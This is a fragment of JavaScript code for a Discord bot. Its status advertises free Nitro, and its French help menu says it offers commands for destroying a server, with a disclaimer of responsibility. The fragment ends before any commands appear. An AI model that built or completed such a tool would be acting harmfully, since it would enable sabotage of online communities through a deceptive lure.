...
const botPrefix = "*"
  ...
  client.user.setActivity("Nitro Gen Free :)");
});
...
client.on('message',  msg => {
    ...
    if(msg.content == "*1help"){
      ...
      .setColor('#0099ff')
      .setTitle('By 𝐖𝟒𝐋𝐋#0001')
      .setURL('https://soon.com')
      .setDescription('Ici vous pouvez trouver toutes les commandes pour détruire un serveur')
      .addField("𝐖𝟒𝐋𝐋#0001 n'est pas responsables de ce que vous en faites!", 'Utilisation à vos risques et périls!')
      .addField('Commandes', 
